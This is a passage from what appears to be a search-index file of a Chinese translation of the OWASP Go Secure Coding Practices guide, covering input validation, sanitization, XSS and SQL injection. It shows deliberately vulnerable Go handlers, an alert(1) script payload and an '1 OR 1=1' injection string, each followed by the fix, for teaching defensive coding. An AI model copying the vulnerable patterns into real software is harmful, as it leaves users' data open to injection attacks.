\uff1aForm\u88abgo\u89c6\u4e3a\u5b57\u7b26\u4e32\u503c\u7684\u6620\u5c04\u3002 \u786e\u4fdd\u6570\u636e\u6709\u6548\u6027\u7684\u5176\u4ed6\u6280\u672f\u5305\u62ec\uff1a \u767d\u540d\u5355-\u5c3d\u53ef\u80fd\u6839\u636e\u5141\u8bb8\u7684\u5b57\u7b26\u767d\u540d\u5355\u9a8c\u8bc1\u8f93\u5165\u3002\u8bf7\u53c2\u89c1 Validation - Strip tags \u3002 \u8fb9\u754c\u68c0\u67e5-\u5e94\u9a8c\u8bc1\u6570\u636e\u548c\u6570\u5b57\u957f\u5ea6\u3002 \u5b57\u7b26\u8f6c\u4e49-\u7528\u4e8e\u7279\u6b8a\u5b57\u7b26\uff0c\u5982\u72ec\u7acb\u5f15\u53f7\u3002 \u6570\u5b57\u9a8c\u8bc1-\u5982\u679c\u8f93\u5165\u662f\u6570\u5b57\u3002 \u68c0\u67e5\u7a7a\u5b57\u8282-\uff08%00\uff09 \u68c0\u67e5\u65b0\u884c\u5b57\u7b26-%0d\uff0c%0a\uff0c\\r\\n \u68c0\u67e5\u8def\u5f84\u66f4\u6539\u5b57\u7b26-../\u6216\\.. \u68c0\u67e5\u6269\u5c55\u7684UTF-8-\u68c0\u67e5\u7279\u6b8a\u5b57\u7b26\u7684\u53ef\u9009\u8868\u793a\u5f62\u5f0f \u6ce8\u610f \uff1a\u786e\u4fddHTTP\u8bf7\u6c42\u548c\u54cd\u5e94\u5934\u53ea\u5305\u542bASCII\u5b57\u7b26\u3002 \u5b58\u5728\u5904\u7406go\u4e2d\u5b89\u5168\u6027\u7684\u7b2c\u4e09\u65b9\u8f6f\u4ef6\u5305\uff1a Gorilla\u662fWeb\u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u6027\u6700\u5e38\u7528\u7684\u5305\u4e4b\u4e00\u3002\u5b83\u652f\u6301websockets\u3001cookie\u4f1a\u8bdd\u3001rpc\u7b49\u3002 Form \u5c06url.values\u89e3\u7801\u4e3ago\u503c\uff0c\u5e76\u5c06go\u503c\u7f16\u7801\u4e3aurl.values\u3002Dual Array\u548cFull map\u652f\u6301\u3002 Validator \u8fdb\u884cGo \u7ed3\u6784\u4f53\u548c\u5b57\u6bb5\u9a8c\u8bc1\uff0c\u5305\u62ec\u8de8\u5b57\u6bb5\u3001\u8de8\u7ed3\u6784\u4f53\u3001\u6620\u5c04\u4ee5\u53ca\u5207\u7247\u548c\u6570\u7ec4\u3002","title":"\u7528\u6237\u4ea4\u4e92"},{"location":"application-security/sdl/go-scp/#_5","text":"\u5f53\u9700\u8981\u4f7f\u7528\u6587\u4ef6\u65f6\uff08read\u6216write\u6587\u4ef6\uff09\u4e5f\u5e94\u8be5\u8fdb\u884c\u9a8c\u8bc1\uff0c\u56e0\u4e3a\u5927\u591a\u6570\u6587\u4ef6\u64cd\u4f5c\u64cd\u4f5c\u90fd\u5904\u7406\u7528\u6237\u6570\u636e\u3002 \u5176\u4ed6\u6587\u4ef6\u68c0\u67e5\u8fc7\u7a0b\u5305\u62ec\"\u6587\u4ef6\u5b58\u5728\u6027\u68c0\u67e5\"\uff0c\u4ee5\u9a8c\u8bc1\u6587\u4ef6\u540d\u662f\u5426\u5b58\u5728\u3002 \u9644\u52a0\u6587\u4ef6\u4fe1\u606f\u5728 \u6587\u4ef6\u7ba1\u7406\u90e8\u5206 \uff0c\u6709\u5173\u9519\u8bef\u5904\u7406\u7684\u4fe1\u606f\u53ef\u4ee5\u5728\u6587\u6863\u7684 \u9519\u8bef\u5904\u7406 \u90e8\u5206\u627e\u5230\u3002","title":"\u6587\u4ef6\u64cd\u4f5c"},{"location":"application-security/sdl/go-scp/#_6","text":"\u5f53\u6570\u636e\u4ece\u53d7\u4fe1\u4efb\u7684\u6e90\u4f20\u9012\u5230\u4e0d\u53d7\u4fe1\u4efb\u7684\u6e90\u65f6\uff0c\u5e94\u8fdb\u884c\u5b8c\u6574\u6027\u68c0\u67e5\u3002\u8fd9\u4fdd\u8bc1\u4e86\u6570\u636e\u6ca1\u6709\u88ab\u7be1\u6539\uff0c\u6211\u4eec\u6b63\u5728\u63a5\u6536\u9884\u671f\u7684\u6570\u636e\u3002\u5176\u4ed6\u6570\u636e\u6e90\u68c0\u67e5\u5305\u62ec\uff1a \u8de8\u7cfb\u7edf\u4e00\u81f4\u6027\u68c0\u67e5 Hash\u7edf\u8ba1 \u53c2\u7167\u5b8c\u6574\u6027 \u6ce8\u610f \uff1a\u5728\u73b0\u4ee3\u5173\u7cfb\u6570\u636e\u5e93\u4e2d\uff0c\u5982\u679c\u4e3b\u952e\u5b57\u6bb5\u4e2d\u7684\u503c\u4e0d\u53d7\u6570\u636e\u5e93\u5185\u90e8\u673a\u5236\u7684\u7ea6\u675f\uff0c\u90a3\u4e48\u5e94\u8be5\u5bf9\u5b83\u4eec\u8fdb\u884c\u9a8c\u8bc1\uff1a \u552f\u4e00\u6027\u68c0\u67e5 \u8868\u67e5\u8be2\u68c0\u67e5","title":"\u6570\u636e\u6e90"},{"location":"application-security/sdl/go-scp/#post","text":"\u6839\u636e\u6570\u636e\u9a8c\u8bc1\u7684\u6700\u4f73\u5b9e\u8df5\uff0c\u8f93\u5165\u9a8c\u8bc1\u53ea\u662f\u6570\u636e\u9a8c\u8bc1\u6307\u5357\u7684\u7b2c\u4e00\u90e8\u5206\u3002\u56e0\u6b64\uff0c\u8fd8\u5e94\u6267\u884c\u9a8c\u8bc1\u540e\u64cd\u4f5c\u3002\u4f7f\u7528\u7684\u9a8c\u8bc1\u540e\u64cd\u4f5c\u56e0\u4e0a\u4e0b\u6587\u800c\u5f02\uff0c\u5206\u4e3a\u4e09\u7c7b\uff1a \u5f3a\u5236\u6267\u884c \uff1a\u4e3a\u4e86\u66f4\u597d\u5730\u4fdd\u8bc1\u6211\u4eec\u7684\u5e94\u7528\u548c\u6570\u636e\uff0c\u5b58\u5728\u7740\u51e0\u79cd\u6267\u884c\u7c7b\u578b\u3002 \u901a\u77e5\u7528\u6237\u63d0\u4ea4\u7684\u6570\u636e\u4e0d\u7b26\u5408\u8981\u6c42\uff0c\u56e0\u6b64\u5e94\u4fee\u6539\u6570\u636e\u4ee5\u7b26\u5408\u8981\u6c42\u3002 \u5728\u670d\u52a1\u5668\u7aef\u4fee\u6539\u7528\u6237\u63d0\u4ea4\u7684\u6570\u636e\uff0c\u800c\u4e0d\u901a\u77e5\u7528\u6237\u6240\u505a\u7684\u66f4\u6539\uff0c\u8fd9\u6700\u9002\u7528\u4e8e\u5177\u6709\u4ea4\u4e92\u4f7f\u7528\u7684\u7cfb\u7edf\u3002 \u6ce8\u610f \uff1a\u540e\u8005\u4e3b\u8981\u7528\u4e8e\u5916\u89c2\u66f4\u6539\uff08\u4fee\u6539\u7528\u6237\u654f\u611f\u6570\u636e\u53ef\u80fd\u5bfc\u81f4\u622a\u65ad\u7b49\u95ee\u9898\uff0c\u4ece\u800c\u5bfc\u81f4\u6570\u636e\u4e22\u5931\uff09\u3002 \u54a8\u8be2 \uff1a\u5efa\u8bae\u64cd\u4f5c\u901a\u5e38\u5141\u8bb8\u8f93\u5165\u4e0d\u53d8\u7684\u6570\u636e\uff0c\u4f46\u6d88\u606f\u6765\u6e90\u53c2\u4e0e\u8005\u88ab\u544a\u77e5\u6240\u8ff0\u6570\u636e\u5b58\u5728\u95ee\u9898\u3002\u8fd9\u6700\u9002\u7528\u4e8e\u975e\u4ea4\u4e92\u5f0f\u7cfb\u7edf\u3002 \u9a8c\u8bc1 \uff1a\u9a8c\u8bc1\u662f\u6307\u5efa\u8bae\u64cd\u4f5c\u4e2d\u7684\u7279\u6b8a\u60c5\u51b5\u3002\u5728\u8fd9\u4e9b\u60c5\u51b5\u4e0b\uff0c\u7528\u6237\u63d0\u4ea4\u6570\u636e\uff0c\u6e90\u53c2\u4e0e\u8005\u8981\u6c42\u7528\u6237\u9a8c\u8bc1\u6240\u8ff0\u6570\u636e\u5e76\u5efa\u8bae\u66f4\u6539\u3002\u7136\u540e\uff0c\u7528\u6237\u63a5\u53d7\u8fd9\u4e9b\u66f4\u6539\u6216\u4fdd\u7559\u5176\u539f\u59cb\u8f93\u5165\u3002 \u4e00\u4e2a\u7b80\u5355\u7684\u65b9\u6cd5\u6765\u8bf4\u660e\u8fd9\u662f\u4e00\u4e2a\u8d26\u5355\u5730\u5740\u8868\u5355\uff0c\u7528\u6237\u8f93\u5165\u4ed6\u7684\u5730\u5740\uff0c\u7cfb\u7edf\u5efa\u8bae\u4e0e\u5e10\u6237\u76f8\u5173\u7684\u5730\u5740\u3002\u7136\u540e\uff0c\u7528\u6237\u63a5\u53d7\u5176\u4e2d\u4e00\u4e2a\u5efa\u8bae\u6216\u53d1\u9001\u5230\u6700\u521d\u8f93\u5165\u7684\u5730\u5740\u3002","title":"POST\u9a8c\u8bc1\u64cd\u4f5c"},{"location":"application-security/sdl/go-scp/#_7","text":"\u5904\u7406\u662f\u6307\u5220\u9664\u6216\u66ff\u6362\u63d0\u4ea4\u7684\u6570\u636e\u7684\u8fc7\u7a0b\u3002\u5728\u5904\u7406\u6570\u636e\u65f6\uff0c\u5728\u8fdb\u884c\u4e86\u6b63\u786e\u7684\u9a8c\u8bc1\u68c0\u67e5\u4e4b\u540e\uff0c\u901a\u5e38\u4f1a\u91c7\u53d6\u4e00\u4e2a\u989d\u5916\u7684\u6b65\u9aa4\u6765\u52a0\u5f3a\u6570\u636e\u5b89\u5168\u6027\uff0c\u5373\u5904\u7406\u3002 \u6700\u5e38\u7528\u7684\u5904\u7406\u65b9\u6cd5\u5982\u4e0b\uff1a","title":"\u5904\u7406"},{"location":"application-security/sdl/go-scp/#_8","text":"\u5728\u672c\u673a\u5305HTML\u4e2d\uff0c\u6709\u4e24\u4e2a\u7528\u4e8e\u6e05\u7406\u7684\u51fd\u6570\uff1a\u4e00\u4e2a\u7528\u4e8e\u8f6c\u4e49HTML\u6587\u672c\uff0c\u53e6\u4e00\u4e2a\u7528\u4e8e\u53d6\u6d88\u8f6c\u4e49HTML\u3002\u51fd\u6570 escapeString() \u63a5\u53d7\u4e00\u4e2a\u5b57\u7b26\u4e32\u5e76\u8fd4\u56de\u5e26\u6709\u7279\u6b8a\u8f6c\u4e49\u5b57\u7b26\u7684\u76f8\u540c\u5b57\u7b26\u4e32\u3002\u5373\uff0c \u53d8\u4e3a lt\uff1b\u3002\u8bf7\u6ce8\u610f\uff0c\u6b64\u51fd\u6570\u53ea\u8f6c\u4e49\u4ee5\u4e0b\u4e94\u4e2a\u5b57\u7b26\uff1a \u3001 \u3001 \u3001'\u548c'\u3002\u76f8\u53cd\uff0c\u8fd8\u6709 unescapeString() \u51fd\u6570\u53ef\u4ee5\u4ece\u5b9e\u4f53\u8f6c\u6362\u4e3a\u5b57\u7b26\u3002","title":"\u5c06\u5c0f\u4e8e\u5b57\u7b26\u7684\u5355\u4e2a\u5b57\u7b26\u8f6c\u5316\u4e3a\u5b9e\u4f53"},{"location":"application-security/sdl/go-scp/#_9","text":"\u867d\u7136 html/template \u5305\u6709 striptags() \u51fd\u6570\uff0c\u4f46\u5b83\u662f\u672a\u5bfc\u51fa\u7684\u3002\u7531\u4e8e\u6ca1\u6709\u5176\u4ed6\u672c\u673a\u5305\u5177\u6709\u53bb\u9664\u6240\u6709\u6807\u8bb0\u7684\u529f\u80fd\uff0c\u56e0\u6b64\u53ef\u4ee5\u9009\u62e9\u4f7f\u7528\u7b2c\u4e09\u65b9\u5e93\uff0c\u6216\u8005\u590d\u5236\u6574\u4e2a\u51fd\u6570\u4ee5\u53ca\u5b83\u7684\u79c1\u6709\u7c7b\u548c\u51fd\u6570\u3002 \u4e00\u4e9b\u7b2c\u4e09\u65b9\u5e93\u53ef\u4ee5\u5b9e\u73b0\u8fd9\u4e00\u70b9\uff1a https://github.com/kennygrant/sanitize https://github.com/maxwells/sanitize https://github.com/microcosm-cc/bluemonday","title":"\u5220\u9664\u6240\u6709\u6807\u7b7e"},{"location":"application-security/sdl/go-scp/#_10","text":"text/template \u548c html/template \u5305\u62ec\u4e00\u79cd\u4ece\u6a21\u677f\u4e2d\u5220\u9664\u7a7a\u767d\u7684\u65b9\u6cd5\uff0c\u65b9\u6cd5\u662f\u5728\u64cd\u4f5c\u7684\u5206\u9694\u7b26\u5185\u4f7f\u7528\u51cf\u53f7\u3002 \u4f7f\u7528\u6e90\u4ee3\u7801\u6267\u884c\u6a21\u677f {{- 23}} {{45 -}} \u5c06\u5bfc\u81f4\u4ee5\u4e0b\u8f93\u51fa 23 45 \u6ce8\u610f \uff1a\u5982\u679c\u51cf\u53f7\u4e0d\u5728\u5f00\u59cb\u52a8\u4f5c\u5206\u9694\u7b26{{\u4e4b\u540e\u6216\u7ed3\u675f\u52a8\u4f5c\u5206\u9694\u7b26\u4e4b\u524d}}\uff0c\u51cf\u53f7-\u5c06\u5e94\u7528\u4e8e\u8be5\u503c\u3002 \u6a21\u677f\u6e90 {{ -3 }} \u8f93\u51fa -3","title":"\u5220\u9664\u6362\u884c\u7b26\u3001\u5236\u8868\u7b26\u548c\u591a\u4f59\u7684\u7a7a\u683c"},{"location":"application-security/sdl/go-scp/#url","text":"\u5728 net/http \u5305\u4e2d\u6709\u4e00\u4e2a\u79f0\u4e3a ServeMux \u7684HTTP\u8bf7\u6c42\u591a\u8def\u590d\u7528\u5668\u7c7b\u578b\u3002\u5b83\u7528\u4e8e\u5c06\u4f20\u5165\u8bf7\u6c42\u4e0e\u6ce8\u518c\u6a21\u5f0f\u5339\u914d\uff0c\u5e76\u8c03\u7528\u4e0e\u8bf7\u6c42\u7684URL\u6700\u5339\u914d\u7684\u5904\u7406\u7a0b\u5e8f\u3002\u9664\u4e86\u4e3b\u8981\u76ee\u7684\u5916\uff0c\u5b83\u8fd8\u8d1f\u8d23\u6e05\u7406URL\u8bf7\u6c42\u8def\u5f84\uff0c\u91cd\u5b9a\u5411\u5305\u542b\u7684\u4efb\u4f55\u8bf7\u6c42\u3002.\u6216..\u5143\u7d20\u6216\u91cd\u590d\u659c\u6760\u5230\u4e00\u4e2a\u7b49\u6548\u7684\u3001\u66f4\u6e05\u6670\u7684URL\u3002 \u4e00\u4e2a\u7b80\u5355\u7684Mux\u793a\u4f8b\u8bf4\u660e\uff1a func main() { mux := http.NewServeMux() rh := http.RedirectHandler( http://yourDomain.org , 307) mux.Handle( /login , rh) log.Println( Listening... ) http.ListenAndServe( :3000 , mux) } \u6ce8\u610f \uff1a\u8bf7\u8bb0\u4f4f\uff0c ServeMux \u4e0d\u4f1a\u66f4\u6539 connect\u8bf7\u6c42\u7684URL\u8bf7\u6c42\u8def\u5f84\uff0c\u56e0\u6b64\uff0c\u5982\u679c\u4e0d\u9650\u5236\u5141\u8bb8\u7684\u8bf7\u6c42\u65b9\u6cd5\uff0c\u53ef\u80fd\u4f1a\u4f7f\u5e94\u7528\u7a0b\u5e8f\u5bb9\u6613\u53d7\u5230 \u8def\u5f84\u904d\u5386\u653b\u51fb \u3002 \u7b2c\u4e09\u65b9\u8f6f\u4ef6\u5305\uff1a Gorilla Toolkit - MUX","title":"URL\u8bf7\u6c42\u8def\u5f84"},{"location":"application-security/sdl/go-scp/#_11","text":"\u867d\u7136\u5728 OWASP SCP\u5feb\u901f\u53c2\u8003\u6307\u5357 \u4e2d\u53ea\u67096\u4e2a\u9879\u76ee\u7b26\u53f7\u90e8\u5206\uff0c\u4f46\u662f\u5728Web\u5e94\u7528\u7a0b\u5e8f\u5f00\u53d1\u4e2d\uff0c\u8f93\u51fa\u7f16\u7801\u7684\u9519\u8bef\u505a\u6cd5\u975e\u5e38\u666e\u904d\uff0c\u56e0\u6b64\u5bfc\u81f4\u4e86\u7b2c\u4e00\u5927\u6f0f\u6d1e\uff1a \u6ce8\u5165 \u3002 \u968f\u7740Web\u5e94\u7528\u7a0b\u5e8f\u53d8\u5f97\u590d\u6742\u548c\u4e30\u5bcc\uff0c\u5b83\u4eec\u62e5\u6709\u7684\u6570\u636e\u6e90\u8d8a\u591a\uff1a\u7528\u6237\u3001\u6570\u636e\u5e93\u3001\u4e09\u5341\u65b9\u670d\u52a1\u7b49\u3002\u5728\u67d0\u4e2a\u65f6\u95f4\u70b9\uff0c\u6536\u96c6\u5230\u7684\u6570\u636e\u88ab\u8f93\u51fa\u5230\u5177\u6709\u7279\u5b9a\u4e0a\u4e0b\u6587\u7684\u67d0\u4e9b\u5a92\u4f53\uff08\u5982Web\u6d4f\u89c8\u5668\uff09\u3002\u5982\u679c\u6ca1\u6709\u5f3a\u7684\u8f93\u51fa\u7f16\u7801\u7b56\u7565\uff0c\u5219\u6b63\u597d\u53d1\u751f\u6ce8\u5165\u3002 \u5f53\u7136\uff0c\u60a8\u5df2\u7ecf\u542c\u8bf4\u4e86\u6211\u4eec\u5c06\u5728\u672c\u8282\u4e2d\u8ba8\u8bba\u7684\u6240\u6709\u5b89\u5168\u95ee\u9898\uff0c\u4f46\u662f\u60a8\u771f\u7684\u77e5\u9053\u8fd9\u4e9b\u95ee\u9898\u662f\u5982\u4f55\u53d1\u751f\u7684\u548c/\u6216\u5982\u4f55\u907f\u514d\u7684\u5417\uff1f","title":"\u8f93\u51fa\u7f16\u7801"},{"location":"application-security/sdl/go-scp/#xss","text":"\u5927\u591a\u6570\u5f00\u53d1\u4eba\u5458\u90fd\u542c\u8bf4\u8fc7\uff0c\u4f46\u5927\u591a\u6570\u4eba\u4ece\u672a\u5c1d\u8bd5\u8fc7\u4f7f\u7528XSS\u5f00\u53d1Web\u5e94\u7528\u7a0b\u5e8f\u3002 \u81ea2003\u5e74\u4ee5\u6765\uff0c\u8de8\u7ad9\u70b9\u811a\u672c\u4e00\u76f4\u4f4d\u4e8eOWASP\u7684\u524d10\u4f4d\uff0c\u5b83\u4ecd\u7136\u662f\u4e00\u4e2a\u5e38\u89c1\u7684\u6f0f\u6d1e\u30022013\u5e74\u7684\u7248\u672c\u975e\u5e38\u8be6\u7ec6\u5730\u4ecb\u7ecd\u4e86XSS\uff1a\u653b\u51fb\u5411\u91cf\u3001\u5b89\u5168\u5f31\u70b9\u3001\u6280\u672f\u5f71\u54cd\u548c\u4e1a\u52a1\u5f71\u54cd\u3002 \u7b80\u800c\u8a00\u4e4b \u5982\u679c\u4e0d\u786e\u4fdd\u6240\u6709\u7528\u6237\u63d0\u4f9b\u7684\u8f93\u5165\u90fd\u88ab\u6b63\u786e\u8f6c\u4e49\uff0c\u6216\u8005\u5728\u5c06\u8be5\u8f93\u5165\u5305\u542b\u5230\u8f93\u51fa\u9875\u4e4b\u524d\uff0c\u4e0d\u901a\u8fc7\u670d\u52a1\u5668\u7aef\u8f93\u5165\u9a8c\u8bc1\u6765\u9a8c\u8bc1\u5176\u5b89\u5168\u6027\uff0c\u90a3\u4e48\u60a8\u5c06\u5f88\u5bb9\u6613\u53d7\u5230\u653b\u51fb\u3002\uff08 source \uff09 Go\uff0c\u5c31\u50cf\u5176\u4ed6\u591a\u7528\u9014\u7f16\u7a0b\u8bed\u8a00\u4e00\u6837\uff0c\u5c3d\u7ba1\u6587\u6863\u4e2d\u660e\u786e\u8bf4\u660e\u4e86\u5982\u4f55\u4f7f\u7528 html/template \u5305\uff0c\u4f46\u5b83\u62e5\u6709\u6240\u6709\u9700\u8981\u5904\u7406\u7684\u4e1c\u897f\uff0c\u5e76\u4f7f\u60a8\u5bb9\u6613\u53d7\u5230XSS\u7684\u653b\u51fb\u3002\u5f88\u5bb9\u6613\u627e\u5230\u4f7f\u7528net/http\u548cio\u5305\u7684\"hello world\"\u793a\u4f8b\uff0c\u5728\u4e0d\u4e86\u89e3\u5b83\u7684\u60c5\u51b5\u4e0b\uff0c\u60a8\u5f88\u5bb9\u6613\u53d7\u5230XSS\u7684\u653b\u51fb\u3002 \u4ee3\u7801\uff1a package main import net/http import io func handler (w http.ResponseWriter, r *http.Request) { io.WriteString(w, r.URL.Query().Get( param1 )) } func main () { http.HandleFunc( / , handler) http.ListenAndServe( :8080 , nil) } \u6b64\u4ee3\u7801\u6bb5\u521b\u5efa\u5e76\u542f\u52a8\u4e00\u4e2aHTTP\u670d\u52a1\u5668\uff0c\u4fa6\u542c\u7aef\u53e38080(main())\uff0c\u5904\u7406\u670d\u52a1\u5668\u6839\u76ee\u5f55(/)\u4e0a\u7684\u8bf7\u6c42\u3002 \u5904\u7406\u8bf7\u6c42\u7684handler()\u51fd\u6570\u9700\u8981\u4e00\u4e2a\u67e5\u8be2\u5b57\u7b26\u4e32\u53c2\u6570 param1 \uff0c\u7136\u540e\u5c06\u5176\u503c\u5199\u5165\u54cd\u5e94\u6d41\uff08w\uff09\u3002 \u7531\u4e8e Content-Type HTTP\u54cd\u5e94\u5934\uff0c\u5c06\u4f7f\u7528go http.detectcontenttype\u9ed8\u8ba4\u503c\uff0c\u8be5\u503c\u9075\u5faa WhatWG\u89c4\u8303 \u3002 \u56e0\u6b64\uff0c\u4f7f param1 \u7b49\u4e8e\"test\"\uff0c\u5c06\u5bfc\u81f4 Content-Type HTTP\u54cd\u5e94\u5934\u4ee5text/plain\u683c\u5f0f\u53d1\u9001\u3002 \u4f46\u5982\u679c param1 \u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u662f h1 \uff0c\u5219 Content-Type \u5c06\u662ftext/html\u3002 \u60a8\u53ef\u80fd\u8ba4\u4e3a\uff0c\u4f7f param1 \u7b49\u4e8e\u4efb\u4f55HTML\u6807\u8bb0\u90fd\u4f1a\u5bfc\u81f4\u76f8\u540c\u7684\u884c\u4e3a\uff0c\u4f46\u5b83\u4e0d\u4f1a\uff1a\u4f7f param1 \u7b49\u4e8e h2 \u3001 span \u6216 form \u5c06\u4f7f Content-Type \u4ee5plain/text\u5f62\u5f0f\u53d1\u9001\uff0c\u800c\u4e0d\u662f\u4ee5\u9884\u671f\u7684text/html\u5f62\u5f0f\u53d1\u9001\u3002 \u73b0\u5728\uff0c\u8ba9\u6211\u4eec\u4f7f param1 \u7b49\u4e8e script alert(1) /script \u6839\u636ewhatwg-spec\uff0c\u5185\u5bb9\u7c7b\u578bhttp-response-header\u5c06\u4ee5\u6587\u672c/html\u5f62\u5f0f\u53d1\u9001\uff0c\u5c06\u5448\u73b0param1\u503c\uff0c\u5e76\u2026\u8fd9\u91cc\u662fXSS\u8de8\u7ad9\u70b9\u811a\u672c\u3002 \u5728\u4e0e\u8c37\u6b4c\u8ba8\u8bba\u4e86\u8fd9\u4e00\u60c5\u51b5\u540e\uff0c\u4ed6\u4eec\u544a\u8bc9\u6211\u4eec\uff1a \u5b83\u5b9e\u9645\u4e0a\u975e\u5e38\u65b9\u4fbf\uff0c\u65e8\u5728\u80fd\u591f\u6253\u5370HTML\u5e76\u81ea\u52a8\u8bbe\u7f6e\u5185\u5bb9\u7c7b\u578b\u3002\u6211\u4eec\u5e0c\u671b\u7a0b\u5e8f\u5458\u5c06\u4f7f\u7528HTML/\u6a21\u677f\u8fdb\u884c\u9002\u5f53\u7684\u8f6c\u4e49\u3002 \u8c37\u6b4c\u58f0\u660e\u5f00\u53d1\u4eba\u5458\u8d1f\u8d23\u6e05\u7406\u548c\u4fdd\u62a4\u4ed6\u4eec\u7684\u4ee3\u7801\u3002\u6211\u4eec\u5b8c\u5168\u540c\u610f\uff0c\u4f46\u662f\u5728\u5b89\u5168\u6027\u662f\u4f18\u5148\u8003\u8651\u7684\u8bed\u8a00\u4e2d\uff0c\u9664\u4e86\u9ed8\u8ba4\u7684text/plain\u4e4b\u5916\uff0c\u5141\u8bb8\u81ea\u52a8\u8bbe\u7f6e Content-Type \u5e76\u4e0d\u662f\u6700\u597d\u7684\u65b9\u5f0f\u3002 \u8ba9\u6211\u4eec\u6f84\u6e05\u4e00\u4e0b\uff1a text/plain \u548c/\u6216 text/template \u5305\u4e0d\u4f1a\u8ba9\u60a8\u8fdc\u79bbXSS\uff0c\u56e0\u4e3a\u5b83\u4e0d\u4f1a\u6e05\u7406\u7528\u6237\u8f93\u5165\u3002 package main import net/http import text/template func handler(w http.ResponseWriter, r *http.Request) { param1 := r.URL.Query().Get( param1 ) tmpl := template.New( hello ) tmpl, _ = tmpl.Parse(`{{define T }}{{.}}{{end}}`) tmpl.ExecuteTemplate(w, T , param1) } func main() { http.HandleFunc( / , handler) http.ListenAndServe( :8080 , nil) } \u4f7f param1 \u7b49\u4e8e h1 \u5c06\u5bfc\u81f4\u5185\u5bb9\u7c7b\u578b\u4f5c\u4e3atext/html\u53d1\u9001\uff0c\u8fd9\u4f7f\u60a8\u5bb9\u6613\u53d7\u5230XSS\u7684\u653b\u51fb\u3002 \u5c06text/template\u5305\u66ff\u6362\u4e3ahtml/template\u5305\uff0c\u60a8\u5c31\u53ef\u4ee5\u5b89\u5168\u5730\u7ee7\u7eed\u4e86\u3002 package main import net/http import html/template func handler(w http.ResponseWriter, r *http.Request) { param1 := r.URL.Query().Get( param1 ) tmpl := template.New( hello ) tmpl, _ = tmpl.Parse(`{{define T }}{{.}}{{end}}`) tmpl.ExecuteTemplate(w, T , param1) } func main() { http.HandleFunc( / , handler) http.ListenAndServe( :8080 , nil) } \u5f53param1\u7b49\u4e8e h1 \u65f6\uff0c\u4e0d\u4ec5 Content-Type HTTP\u54cd\u5e94\u5934\u5c06\u4ee5text/plain\u683c\u5f0f\u53d1\u9001\u3002 \u4f46\u662f\uff0c param1\u4e5f \u88ab\u6b63\u786e\u7f16\u7801\u5230\u8f93\u51fa\u5a92\u4f53\uff1a\u6d4f\u89c8\u5668\u3002","title":"XSS\u8de8\u7ad9\u811a\u672c"},{"location":"application-security/sdl/go-scp/#sql","text":"\u7531\u4e8e\u7f3a\u4e4f\u6b63\u786e\u7684\u8f93\u51fa\u7f16\u7801\uff0c\u53e6\u4e00\u4e2a\u5e38\u89c1\u7684\u6ce8\u5165\u662fSQL\u6ce8\u5165\uff0c\u8fd9\u4e3b\u8981\u662f\u7531\u4e8e\u4e00\u4e2a\u65e7\u7684\u9519\u8bef\u505a\u6cd5\uff1a\u5b57\u7b26\u4e32\u4e32\u8054\u3002 \u7b80\u800c\u8a00\u4e4b\uff1a\u53ea\u8981\u5c06\u5305\u542b\u4efb\u610f\u5b57\u7b26\uff08\u4f8b\u5982\u5bf9\u6570\u636e\u5e93\u7ba1\u7406\u7cfb\u7edf\u6709\u7279\u6b8a\u610f\u4e49\u7684\u5b57\u7b26\uff09\u7684\u503c\u7684\u53d8\u91cf\u7b80\u5355\u5730\u6dfb\u52a0\u5230\uff08\u90e8\u5206\uff09SQL\u67e5\u8be2\u4e2d\uff0c\u5c31\u5bb9\u6613\u53d7\u5230SQL\u6ce8\u5165\u7684\u653b\u51fb\u3002 \u5047\u8bbe\u60a8\u6709\u5982\u4e0b\u67e5\u8be2\uff1a ctx := context.Background() customerId := r.URL.Query().Get( id ) query := SELECT number, expireDate, cvv FROM creditcards WHERE customerId = + customerId row, _ := db.QueryContext(ctx, query) \u4f60\u5c06\u6bc1\u4e86\u5b83\u3002 \u5f53\u63d0\u4f9b\u6709\u6548\u7684customerId\u65f6\uff0c\u60a8\u5c06\u53ea\u5217\u51fa\u8be5\u5ba2\u6237\u7684\u4fe1\u7528\u5361\uff0c\u4f46\u5982\u679ccustomerId\u53d8\u4e3a1\u62161=1\u4f1a\u600e\u4e48\u6837\uff1f \u60a8\u7684\u67e5\u8be2\u5c06\u5982\u4e0b\u6240\u793a\uff1a SELECT number, expireDate, cvv FROM creditcards WHERE customerId = 1 OR 1=1 \u60a8\u5c06\u8f6c\u50a8\u6240\u6709\u8868\u8bb0\u5f55\uff08\u662f\u7684\uff0c\u4efb\u4f55\u8bb0\u5f55\u76841=1\u90fd\u662f\u771f\u7684\uff09\uff01 \u53ea\u6709\u4e00\u79cd\u65b9\u6cd5\u53ef\u4ee5\u4fdd\u8bc1\u6570\u636e\u5e93\u7684\u5b89\u5168\uff1a Prepared Statements \u3002 ctx := context.Background() customerId := r.URL.Query().Get( id ) query := SELECT number, expireDate, cvv FROM creditcards WHERE customerId = ? stmt, _ := db.QueryContext(ctx, query, customerId) \u6ce8\u610f\u5230\u5360\u4f4d\u7b26\u4e86?\u4ee5\u53ca\u60a8\u7684\u67e5\u8be2\u65b9\u5f0f\uff1a \u53ef\u8bfb\u6027\u5f3a \u8f83\u77ed \u5b89\u5168\u7684 \u51c6\u5907\u597d\u7684\u8bed\u53e5\u4e2d\u7684\u5360\u4f4d\u7b26\u8bed\u6cd5\u662f\u7279\u5b9a\u4e8e\u6570\u636e\u5e93\u7684\u3002\u4f8b\u5982\uff0c\u6bd4\u8f83mysql\u3001postgresql\u548coracle\uff1a MySQL PostgreSQL Oracle WHERE col = ? WHERE col = $1 WHERE col = :col VALUES(?, ?, ?) VALUES($1, $2, $3) VALUES(:val1, :val2, :val3) \u68c0\u67e5\u672c\u6307\u5357\u4e2d\u7684\"\u6570\u636e\u5e93\u5b89\u5168\u6027\"\u90e8\u5206\uff0c\u4ee5\u83b7\u53d6\u6709\u5173\u6b64\u4e3b\u9898\u7684\u8be6\u7ec6\u4fe1\u606f\u3002","title":"SQL\u6ce8\u5165"},{"location":"application-security/sdl/go-scp/#_12","text":"","title":"\u8ba4\u8bc1\u4e0e\u5bc6\u7801\u7ba1\u7406"},{"location":"application-security/sdl/go-scp/#_13","text":"OWASP\u5b89\u5168\u7f16\u7801\u5b9e\u8df5\u662f\u4e00\u4e2a\u4fbf\u5229\u7684\u6587\u6863\uff0c\u53ef\u4ee5\u5e2e\u52a9\u5f00\u53d1\u4eba\u5458\u9a8c\u8bc1\u5728\u9879\u76ee\u5b9e\u73b0\u671f\u95f4\u662f\u5426\u9075\u5faa\u4e86\u6240\u6709\u7684\u6700\u4f73\u5b9e\u8df5\u3002\u8eab\u4efd\u9a